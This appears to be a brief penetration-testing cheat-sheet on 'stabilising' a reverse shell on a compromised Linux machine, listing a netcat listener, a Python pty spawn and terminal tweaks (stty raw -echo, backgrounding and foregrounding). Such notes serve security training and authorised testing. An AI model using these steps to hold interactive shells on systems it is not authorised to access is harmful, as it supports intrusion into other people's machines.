# Stable Shell
<h3>How To Get Stable  On Linux After Doing It Compromised</h3><br>
1. nc -lnvp 80     # Listening For Reverse Shell <br><p>
python -c "import pty;pty.spawn('/bin/bash');"
Ctrl+z                    # Press After Getting The Shell To Pause The Session<br>
stty raw -echo            # Setting Up The Shell <br>
nc -lnvp 80 or fg.        # To Continue The Session<br>

